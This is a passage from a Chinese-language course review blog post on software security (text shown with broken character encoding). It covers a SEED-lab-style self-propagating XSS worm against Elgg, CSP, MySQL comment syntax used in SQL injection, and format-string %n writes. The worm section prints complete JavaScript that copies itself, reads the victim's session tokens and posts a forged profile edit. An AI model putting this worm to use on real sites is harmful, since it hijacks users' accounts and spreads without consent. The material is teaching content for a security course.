<h3 id="åˆ›é€ ä¸€ä¸ªè‡ªæˆ‘ä¼ æ’­çš„-XSS-è •è™«ï¼šé€šè¿‡-DOM-æ–¹æ³•å®ç°"><a href="#åˆ›é€ ä¸€ä¸ªè‡ªæˆ‘ä¼ æ’­çš„-XSS-è •è™«ï¼šé€šè¿‡-DOM-æ–¹æ³•å®ç°" class="headerlink" title="åˆ›é€ ä¸€ä¸ªè‡ªæˆ‘ä¼ æ’­çš„ XSS è •è™«ï¼šé€šè¿‡ DOM æ–¹æ³•å®ç°"></a>åˆ›é€ ä¸€ä¸ªè‡ªæˆ‘ä¼ æ’­çš„ XSS è •è™«ï¼šé€šè¿‡ DOM æ–¹æ³•å®ç°</h3><p>å½“ä¸€ä¸ªé¡µé¢åŠ è½½å®Œæ¯•æ—¶ï¼Œæµè§ˆå™¨ä¼šæŠŠé¡µé¢çš„å†…å®¹å­˜æ”¾åœ¨ä¸€ä¸ªæ ‘çš„æ•°æ®ç»“æ„é‡Œï¼Œå¹¶æä¾› API ä¾› JavaScript è®¿é—®å’Œä¿®æ”¹æ ‘é‡Œçš„æ•°æ®ã€‚è¯¥æ•°æ®ç»“æ„å« DOMï¼ˆDocument Object Modelï¼‰ï¼Œå®ƒçš„ API å« DOM APIã€‚é€šè¿‡è¿™äº› APIï¼Œæˆ‘ä»¬å¯ä»¥è®¿é—®æ ‘çš„æ¯ä¸ªèŠ‚ç‚¹ã€‚å¦‚æœä¸€ä¸ªç½‘é¡µåŒ…å« JavaScript ä»£ç ï¼Œè¿™æ®µä»£ç ä¹Ÿå°†è¢«å­˜å‚¨åœ¨æ ‘ä¸­çš„ä¸€ä¸ªèŠ‚ç‚¹ã€‚å¦‚æœæˆ‘ä»¬çŸ¥é“å“ªä¸ª DOM èŠ‚ç‚¹åŒ…å«æ­¤ä»£ç ï¼Œå°±èƒ½ä½¿ç”¨ DOM API æ¥ä»è¯¥èŠ‚ç‚¹è·å–è¯¥ä»£ç ã€‚ä¸ºäº†æ˜“äºå¯»æ‰¾èŠ‚ç‚¹ï¼Œæˆ‘ä»¬éœ€è¦åšçš„æ˜¯ç»™ JavaScript èŠ‚ç‚¹å–ä¸€ä¸ªåå­—ï¼Œå¹¶ç”¨ <code>document.getElementById()</code> API æ¥æ‰¾åˆ°è¯¥èŠ‚ç‚¹ã€‚ä¸‹é¢ï¼Œæˆ‘ä»¬å±•ç¤ºäº†ä¸€æ®µä»£ç æ ·ä¾‹ï¼Œå…¶å¯ä»¥å¤åˆ¶è‡ªèº«ã€‚</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;script id=<span class="string">"worm"</span>&gt;</span><br><span class="line">    </span><br><span class="line"><span class="comment">// Use DOM API to get a copy of the content in a DOM node.</span></span><br><span class="line"><span class="keyword">var</span> strCode = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">"worm"</span>).<span class="property">innerHTML</span>;</span><br><span class="line">    </span><br><span class="line"><span class="comment">// Displays the tag content</span></span><br><span class="line"><span class="title function_">alert</span>(strCode);</span><br><span class="line">    </span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>åœ¨ä¸Šé¢çš„ä»£ç ä¸­ï¼Œæˆ‘ä»¬ç»™ <code>script</code> å—å–åä¸º <code>worm</code>ï¼ˆç”¨ä»€ä¹ˆåå­—éƒ½è¡Œï¼‰ã€‚æˆ‘ä»¬ä½¿ç”¨ <code>document.getElementById("worm")</code> æ¥æ‰¾åˆ°è¯¥ <code>script</code> èŠ‚ç‚¹ï¼Œç„¶åç”¨å®ƒçš„ <code>innerHTML</code> å±æ€§è·å–å…¶å†…å®¹ã€‚æ³¨æ„ï¼Œ<code>innerHTML</code> åªèƒ½ç»™æˆ‘ä»¬èŠ‚ç‚¹çš„å†…éƒ¨å†…å®¹ï¼Œä¸åŒ…æ‹¬å‘¨å›´çš„ <code>script</code> æ ‡ç­¾ã€‚æˆ‘ä»¬åªéœ€åŠ ä¸Šåˆå§‹æ ‡ç­¾ <code>&lt;script id=â€œwormâ€&gt;</code> ä»¥åŠç»“æŸæ ‡ç­¾ <code>&lt;/script&gt;</code> æ¥æ„æˆä¸€ä¸ªå®Œå…¨ç›¸åŒçš„æ¶æ„ä»£ç æ‹·è´ã€‚</p>
<p>é€šè¿‡ä½¿ç”¨ä¸Šè¿°æŠ€æœ¯ï¼Œæˆ‘ä»¬å¯ä»¥æ›´æ”¹ä»£ç æ¸…å• [<a target="_blank" rel="noopener" href="http://10.203.14.25/mod/page/view.php?id=242#xss:list:modifyprofile">xss:list:modifyprofile]</a> ä¸­çš„æ”»å‡»ä»£ç ã€‚ä¸ºäº†æŠŠ â€œSamy is my heroâ€ æ”¾åˆ° <code>description</code> åŒºåŸŸï¼Œæˆ‘ä»¬è¦åœ¨è¯¥ä¿¡æ¯ä¸Šæ·»åŠ ä¸€ä¸ª JavaScript ä»£ç çš„æ‹·è´ï¼Œä½¿å¾—ç›®æ ‡ç”¨æˆ·çš„ä¸»é¡µä¹Ÿæºå¸¦ç›¸åŒçš„è •è™«ï¼Œå¹¶èƒ½æ„ŸæŸ“ä»–äººã€‚è¿™ä¸ªè‡ªä¼ æ’­çš„ JavaScript ä»£ç å¦‚ä¸‹ï¼ˆä»£ç æ¸…å• [<a target="_blank" rel="noopener" href="http://10.203.14.25/mod/page/view.php?id=242#xss:list:self_propagating_xss">xss:list:self_propagating_xss]</a>ï¼‰ã€‚</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=<span class="string">"text/javascript"</span> id=<span class="string">"worm"</span>&gt;</span><br><span class="line"><span class="variable language_">window</span>.<span class="property">onload</span> = <span class="keyword">function</span>(<span class="params"></span>){</span><br><span class="line">  <span class="keyword">var</span> headerTag = <span class="string">"&lt;script id=\"worm\" type=\"text/javascript\"&gt;"</span>;  ğŸ…°</span><br><span class="line">  <span class="keyword">var</span> jsCode = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">"worm"</span>).<span class="property">innerHTML</span>;</span><br><span class="line">  <span class="keyword">var</span> tailTag = <span class="string">"&lt;/"</span> + <span class="string">"script&gt;"</span>;                                   ğŸ…±</span><br><span class="line">    </span><br><span class="line">  <span class="comment">// Put all the pieces together, and apply the URI encoding </span></span><br><span class="line">  <span class="keyword">var</span> wormCode = <span class="built_in">encodeURIComponent</span>(headerTag + jsCode + tailTag);  ğŸ…² </span><br><span class="line">    </span><br><span class="line">  <span class="comment">// Set the content of the description field and access level.</span></span><br><span class="line">  <span class="keyword">var</span> desc = <span class="string">"&amp;description=Samy is my hero"</span> + wormCode;</span><br><span class="line">  desc    += <span class="string">"&amp;accesslevel[description]=2"</span>;                         ğŸ…³</span><br><span class="line">    </span><br><span class="line">  <span class="comment">// Get the name, guid, timestamp, and token.</span></span><br><span class="line">  <span class="keyword">var</span> name = <span class="string">"&amp;name="</span> + elgg.<span class="property">session</span>.<span class="property">user</span>.<span class="property">name</span>;</span><br><span class="line">  <span class="keyword">var</span> guid = <span class="string">"&amp;guid="</span> + elgg.<span class="property">session</span>.<span class="property">user</span>.<span class="property">guid</span>;</span><br><span class="line">  <span class="keyword">var</span> ts    = <span class="string">"&amp;__elgg_ts="</span>+elgg.<span class="property">security</span>.<span class="property">token</span>.<span class="property">__elgg_ts</span>;</span><br><span class="line">  <span class="keyword">var</span> token = <span class="string">"&amp;__elgg_token="</span>+elgg.<span class="property">security</span>.<span class="property">token</span>.<span class="property">__elgg_token</span>;</span><br><span class="line">    </span><br><span class="line">  <span class="comment">// Set the URL</span></span><br><span class="line">  <span class="keyword">var</span> sendurl=<span class="string">"http://www.seed-server.com/action/profile/edit"</span>;</span><br><span class="line">  <span class="keyword">var</span> content = token + ts + name + desc + guid;       </span><br><span class="line">  </span><br><span class="line">  <span class="comment">// Construct and send the Ajax request</span></span><br><span class="line">  <span class="keyword">if</span> (elgg.<span class="property">session</span>.<span class="property">user</span>.<span class="property">guid</span> != <span class="number">47</span>){         </span><br><span class="line">    <span class="comment">// Create and send Ajax request to modify profile </span></span><br><span class="line">    <span class="keyword">var</span> <span class="title class_">Ajax</span>=<span class="literal">null</span>;</span><br><span class="line">    <span class="title class_">Ajax</span> = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br><span class="line">    <span class="title class_">Ajax</span>.<span class="title function_">open</span>(<span class="string">"POST"</span>, sendurl, <span class="literal">true</span>);</span><br><span class="line">    <span class="title class_">Ajax</span>.<span class="title function_">setRequestHeader</span>(<span class="string">"Content-Type"</span>,</span><br><span class="line">                          <span class="string">"application/x-www-form-urlencoded"</span>);</span><br><span class="line">    <span class="title class_">Ajax</span>.<span class="title function_">send</span>(content);</span><br><span class="line">  } </span><br><span class="line">}</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h3 id="CSP"><a href="#CSP" class="headerlink" title="CSP"></a>CSP</h3><p>åµŒå…¥å¼ä»£ç ç”¨nonceæ¥æ˜ç¡®å¯æ‰§è¡Œï¼›é“¾æ¥æ–‡ä»¶åˆ™ä½¿ç”¨<code>script-src 'self' example.com</code>ã€‚</p>
<h2 id="SQLæ³¨å…¥æ”»å‡»"><a href="#SQLæ³¨å…¥æ”»å‡»" class="headerlink" title="SQLæ³¨å…¥æ”»å‡»"></a>SQLæ³¨å…¥æ”»å‡»</h2><p>MySQL æ”¯æŒä¸‰ç§æ³¨é‡Šæ–¹å¼ï¼š</p>
<ul>
<li>ä»¥ <code>#</code> å­—ç¬¦å¼€å§‹ï¼Œç›´åˆ°è¡Œå°¾çš„æ–‡æœ¬å‡è§†ä¸ºæ³¨é‡Šã€‚</li>
<li>ä» <code>â€“</code> å­—ç¬¦å¼€å§‹ï¼Œç›´åˆ°è¡Œå°¾çš„æ–‡æœ¬å‡è§†ä¸ºæ³¨é‡Šã€‚æ³¨æ„ï¼šè¯¥æ–¹å¼è¦æ±‚ç¬¬äºŒä¸ªç ´æŠ˜å·åé¢è·Ÿéšè‡³å°‘ä¸€ä¸ªç©ºæ ¼æˆ–æ§åˆ¶ç¬¦ï¼ˆå¦‚åˆ¶è¡¨ç¬¦ tab ç­‰ï¼‰ã€‚</li>
<li>ä¸ C è¯­è¨€ç±»ä¼¼ï¼Œä»‹äº <code>/*</code> å’Œ <code>*/</code> ä¹‹é—´çš„æ–‡æœ¬è§†ä¸ºæ³¨é‡Šã€‚ä¸å‰é¢ä¸¤ç§æ–¹å¼ä¸åŒï¼Œè¯¥æ–¹å¼å…è®¸æ³¨é‡Šç©¿æ’åœ¨ SQL è¯­å¥ä¸­é—´ï¼Œæˆ–è·¨è¶Šå¤šè¡Œã€‚</li>
</ul>
<p>ä¸‹é¢æˆ‘ä»¬ä¸ºæ¯ç§æ–¹å¼ä¸¾ä¸€ä¸ªä¾‹å­ã€‚</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> employee;   # Comment <span class="keyword">to</span> the <span class="keyword">end</span> <span class="keyword">of</span> line</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> employee;   <span class="comment">-- Comment to the end of line</span></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> <span class="comment">/* In-line comment */</span> employee;</span><br></pre></td></tr></table></figure>

<p>ç›¸å¯¹ç®€å•ã€‚</p>
<h2 id="æ ¼å¼åŒ–å­—ç¬¦ä¸²"><a href="#æ ¼å¼åŒ–å­—ç¬¦ä¸²" class="headerlink" title="æ ¼å¼åŒ–å­—ç¬¦ä¸²"></a>æ ¼å¼åŒ–å­—ç¬¦ä¸²</h2><ul>
<li><code>%n</code>ï¼šè¿™ä¸ªæ ¼å¼è§„å®šç¬¦ä¼šæŠŠç›®å‰å·²æ‰“å°å‡ºçš„å­—ç¬¦çš„ä¸ªæ•°å†™å…¥å†…å­˜ã€‚<code>printf()</code> é‡åˆ° <code>%n</code> æ—¶ï¼Œ<strong>å®ƒè·å– <code>va_list</code> æŒ‡é’ˆæŒ‡å‘çš„å€¼ï¼Œè§†è¯¥å€¼ä¸ºä¸€ä¸ªå†…å­˜åœ°å€ï¼Œç„¶åå°†æ•°æ®å†™å…¥è¯¥åœ°å€ã€‚</strong>ï¼ˆå†™æˆå¤šå°‘ï¼Œå†™è°ã€‚ç‰¹åˆ«æ³¨æ„ï¼šå†™â€œè°â€ï¼Œè¿™ä¸ªâ€œè°â€çš„åœ°å€è¦åœ¨æ ˆä¸Šï¼Œæ‰€æœ‰è¦å°†RAæ”¾ç½®åœ¨badfileå½“ä¸­ï¼ï¼‰</li>
<li></li>
</ul>
<h2 id="Return-to-libc-æ”»å‡»"><a href="#Return-to-libc-æ”»å‡»" class="headerlink" title="Return-to-libc æ”»å‡»"></a>Return-to-libc æ”»å‡»</h2><h2 id="Shellcode-ç¼–ç¨‹"><a href="#Shellcode-ç¼–ç¨‹" class="headerlink" title="Shellcode ç¼–ç¨‹"></a>Shellcode ç¼–ç¨‹</h2></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>æ–‡ç« ä½œè€…: </span><span class="post-copyright-info"><a href="https://stellarhui.github.io">æ‘˜æ˜Ÿçš„è¾‰</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>æ–‡ç« é“¾æ¥: </span><span class="post-copyright-info"><a href="https://stellarhui.github.io/2025/12/20/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E8%B7%B5/%E5%A4%8D%E4%B9%A0/">https://stellarhui.github.io/2025/12/20/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E8%B7%B5/%E5%A4%8D%E4%B9%A0/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>ç‰ˆæƒå£°æ˜: </span><span class="post-copyright-info">æœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨ <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> è®¸å¯åè®®ã€‚è½¬è½½è¯·æ³¨æ˜æ¥æº <a href="https://stellarhui.github.io" target="_blank">çš“æœˆæ˜Ÿè¾°</a>ï¼</span></div></div><div class="tag_share"><div class="post-share"><div class="social-share" data-image="/img/favicon.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2025/12/22/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9CLec6%EF%BC%9A%E5%BA%94%E7%94%A8%E5%B1%82/" title="è®¡ç®—æœºç½‘ç»œï¼ˆ6ï¼‰ï¼šåº”ç”¨å±‚"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info"><div class="info-1"><div class="info-item-1">ä¸Šä¸€ç¯‡</div><div class="info-item-2">è®¡ç®—æœºç½‘ç»œï¼ˆ6ï¼‰ï¼šåº”ç”¨å±‚</div></div><div class="info-2"><div class="info-item-1">ç½‘ç»œåº”ç”¨æ¨¡å‹ä¸»æœºä¹‹é—´å¦‚ä½•è¿›è¡Œäº¤äº’ï¼Ÿå¯ä»¥åˆ†ä¸º2ç§ç»„ç»‡æ¶æ„ï¼š  C/Sæ¨¡å‹ï¼ˆå®¢æˆ·ç«¯/æœåŠ¡å™¨æ¨¡å‹ï¼‰ P2Pæ¨¡å‹  åŸŸåç³»ç»ŸDomain Name System (DNS)ç³»ç»Ÿå°†ç½‘ç«™åç§°ï¼ˆå®é™…æ˜¯ä¸»æœºåï¼‰æ˜ å°„è‡³IPåœ°å€ã€‚  </div></div></div></a><a class="pagination-related" href="/2025/12/08/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9CLec5%EF%BC%9A%E4%BC%A0%E8%BE%93%E5%B1%82/" title="è®¡ç®—æœºç½‘ç»œï¼ˆ5ï¼‰ï¼šä¼ è¾“å±‚"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">ä¸‹ä¸€ç¯‡</div><div class="info-item-2">è®¡ç®—æœºç½‘ç»œï¼ˆ5ï¼‰ï¼šä¼ è¾“å±‚</div></div><div class="info-2"><div class="info-item-1">ä¼ è¾“å±‚ç®€ä»‹ä¼ è¾“å±‚çš„ä½ç½®å’ŒåŠŸèƒ½ä¼ è¾“å±‚ä½äºç½‘ç»œå±‚å’Œåº”ç”¨å±‚ä¹‹é—´ã€‚å¦‚ä¸‹å›¾ã€‚   è¿™é‡Œçš„Transport service interfaceæŒ‡çš„æ˜¯ï¼šoperations provided by transport layer to application programsã€‚è¿™äº›operationså…·ä½“å°±æ˜¯ä¸€äº›åŸè¯­ï¼Œä¾‹å¦‚ï¼š  ä»è€Œï¼Œï¼ˆä»ä½¿ç”¨çš„åŸè¯­è§’åº¦çœ‹ï¼Œï¼‰ä¸¤ä¸ªè¿›ç¨‹ä¹‹é—´çš„é€šä¿¡è¿‡ç¨‹å¯ä»¥è¡¨ç¤ºä¸ºï¼š   ç½‘ç»œå±‚è´Ÿè´£çš„æ˜¯ï¼šæä¾›ä¸åŒä¸»æœºä¹‹é—´çš„é€»è¾‘é€šä¿¡ï¼ˆå¯¹ç­‰å±‚ä¹‹é—´çš„é€šä¿¡å¥½åƒæ˜¯â€œæ°´å¹³â€çš„ï¼Œå®é™…ä¸Šè¦ç»è¿‡ä¸‹å±‚çš„åè®®æ ˆï¼‰ï¼›åº”ç”¨å±‚ä¸Šè¿è¡Œç€ä¸åŒçš„åº”ç”¨ã€‚å› æ­¤ï¼Œä¼ è¾“å±‚æä¾›çš„åŠŸèƒ½æ˜¯ï¼šä¸ºä¸åŒä¸»æœºçš„åº”ç”¨è¿›ç¨‹ä¹‹é—´æä¾›é€»è¾‘é€šä¿¡ã€‚å¦‚ä¸‹å›¾ï¼š  ä¼ è¾“å±‚å¯»å€ä¸ç«¯å£ç«¯å£ä¸ç«¯å£å·ä¸åŒçš„è¿›ç¨‹æ€ä¹ˆä½¿ç”¨åŒä¸€ä¸ªä¼ è¾“å±‚çš„åè®®ï¼ˆå¤ç”¨ï¼‰ä¸å¦ä¸€ä¸ªä¸»æœºçš„è¿›ç¨‹è¿›è¡Œé€šä¿¡ï¼Ÿç­”æ¡ˆæ˜¯ä½¿ç”¨ä¸åŒçš„ç«¯å£ã€‚ç«¯å£å·æ˜¯16ä½çš„æ¯”ç‰¹ä¸²ï¼Œç”¨æ¥æ ‡è¯†æ­£åœ¨é€šä¿¡çš„è¿›ç¨‹ã€‚ç«¯å£å·å¯ä»¥åˆ†ä¸º2ç±»ï¼š  æœåŠ¡å™¨ç«¯ä½¿ç”¨çš„ç«¯å£å·ã€‚ï¼ˆ1ï¼‰0 ~ 1023ï¼šç†ŸçŸ¥çš„ã€å·²ç»å›ºå®šè¿›ç¨‹çš„ç«¯å£å·ï¼ŒIANAå°†å…¶åˆ†é…ç»™FTP, DNSç­‰TCP/IPæœ€é‡è¦çš„ä¸€äº›åº”ç”¨ç¨‹åºã€‚ï¼ˆ2ï¼‰1024 ~ 49151ï¼šç™»è®°ç«¯å£å·ï¼Œéœ€è¦åˆ°IANA...</div></div></div></a></nav></div><div class="aside-content" id="aside-content"><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>ç›®å½•</span><span class="toc-percentage"></span></div><div class="toc-content is-expand"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Set-UID%E7%A8%8B%E5%BA%8F"><span class="toc-number">1.</span> <span class="toc-text">Set-UIDç¨‹åº</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E5%86%85%E5%AE%B9"><span class="toc-number">1.1.</span> <span class="toc-text">çŸ¥è¯†å†…å®¹</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E6%B3%84%E6%BC%8F"><span class="toc-number">1.1.1.</span> <span class="toc-text">æƒé™æ³„æ¼</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%B0%83%E7%94%A8%E5%87%BD%E6%95%B0"><span class="toc-number">1.1.2.</span> <span class="toc-text">è°ƒç”¨å‡½æ•°</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%83%E4%B9%A0"><span class="toc-number">1.2.</span> <span class="toc-text">ç»ƒä¹ </span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%80%9A%E8%BF%87%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E5%AE%9E%E7%8E%B0%E6%94%BB%E5%87%BB"><span class="toc-number">2.</span> <span class="toc-text">é€šè¿‡ç¯å¢ƒå˜é‡å®ç°æ”»å‡»</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB"><span class="toc-number">3.</span> <span class="toc-text">ç¼“å†²åŒºæº¢å‡ºæ”»å‡»</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E5%86%85%E5%AE%B9-1"><span class="toc-number">3.1.</span> <span class="toc-text">çŸ¥è¯†å†…å®¹</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%83%E4%B9%A0-1"><span class="toc-number">3.2.</span> <span class="toc-text">ç»ƒä¹ </span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AB%9E%E6%80%81%E6%9D%A1%E4%BB%B6%E6%94%BB%E5%87%BB"><span class="toc-number">4.</span> <span class="toc-text">ç«æ€æ¡ä»¶æ”»å‡»</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E5%86%85%E5%AE%B9-2"><span class="toc-number">4.1.</span> <span class="toc-text">çŸ¥è¯†å†…å®¹</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E7%9B%B8%E5%85%B3%E5%87%BD%E6%95%B0"><span class="toc-number">4.1.1.</span> <span class="toc-text">æ–‡ä»¶ç›¸å…³å‡½æ•°</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%B2%98%E6%BB%9E-sticky-%E7%AC%A6%E5%8F%B7%E9%93%BE%E6%8E%A5%E4%BF%9D%E6%8A%A4"><span class="toc-number">4.1.2.</span> <span class="toc-text">ç²˜æ» (sticky) ç¬¦å·é“¾æ¥ä¿æŠ¤</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95"><span class="toc-number">4.1.3.</span> <span class="toc-text">æ”»å‡»æ–¹æ³•</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%83%E4%B9%A0-2"><span class="toc-number">4.2.</span> <span class="toc-text">ç»ƒä¹ </span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%86%94%E6%96%AD%E6%94%BB%E5%87%BB"><span class="toc-number">5.</span> <span class="toc-text">ç†”æ–­æ”»å‡»</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B9%BD%E7%81%B5%E6%94%BB%E5%87%BB"><span class="toc-number">6.</span> <span class="toc-text">å¹½çµæ”»å‡»</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E5%86%85%E5%AE%B9-3"><span class="toc-number">6.1.</span> <span class="toc-text">çŸ¥è¯†å†…å®¹</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8E%E7%BB%9F%E8%AE%A1%E6%96%B9%E6%B3%95"><span class="toc-number">6.1.1.</span> <span class="toc-text">åŸºäºç»Ÿè®¡æ–¹æ³•</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%83%E4%B9%A0-3"><span class="toc-number">6.2.</span> <span class="toc-text">ç»ƒä¹ </span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WEB%E5%9F%BA%E7%A1%80"><span class="toc-number">7.</span> <span class="toc-text">WEBåŸºç¡€</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%EF%BC%88CSRF%EF%BC%89"><span class="toc-number">8.</span> <span class="toc-text">è·¨ç«™è¯·æ±‚ä¼ªé€ ï¼ˆCSRFï¼‰</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E5%86%85%E5%AE%B9-4"><span class="toc-number">8.1.</span> <span class="toc-text">çŸ¥è¯†å†…å®¹</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#GET%E8%AF%B7%E6%B1%82%E6%94%BB%E5%87%BB"><span class="toc-number">8.1.1.</span> <span class="toc-text">GETè¯·æ±‚æ”»å‡»</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#POST%E8%AF%B7%E6%B1%82"><span class="toc-number">8.1.2.</span> <span class="toc-text">POSTè¯·æ±‚</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%90%8C%E7%AB%99-cookie"><span class="toc-number">8.1.3.</span> <span class="toc-text">åŒç«™ cookie</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%83%E4%B9%A0-4"><span class="toc-number">8.2.</span> <span class="toc-text">ç»ƒä¹ </span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB"><span class="toc-number">9.</span> <span class="toc-text">è·¨ç«™è„šæœ¬æ”»å‡»</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%9B%E9%80%A0%E4%B8%80%E4%B8%AA%E8%87%AA%E6%88%91%E4%BC%A0%E6%92%AD%E7%9A%84-XSS-%E8%A0%95%E8%99%AB%EF%BC%9A%E9%80%9A%E8%BF%87-DOM-%E6%96%B9%E6%B3%95%E5%AE%9E%E7%8E%B0"><span class="toc-number">9.1.</span> <span class="toc-text">åˆ›é€ ä¸€ä¸ªè‡ªæˆ‘ä¼ æ’­çš„ XSS è •è™«ï¼šé€šè¿‡ DOM æ–¹æ³•å®ç°</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CSP"><span class="toc-number">9.2.</span> <span class="toc-text">CSP</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB"><span class="toc-number">10.</span> <span class="toc-text">SQLæ³¨å…¥æ”»å‡»</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2"><span class="toc-number">11.</span> <span class="toc-text">æ ¼å¼åŒ–å­—ç¬¦ä¸²</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Return-to-libc-%E6%94%BB%E5%87%BB"><span class="toc-number">12.</span> <span class="toc-text">Return-to-libc æ”»å‡»</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Shellcode-%E7%BC%96%E7%A8%8B"><span class="toc-number">13.</span> <span class="toc-text">Shellcode ç¼–ç¨‹</span></a></li></ol></div></div></div></div></main><footer id="footer" style="background-image: url(/img/background.jpg);"><div 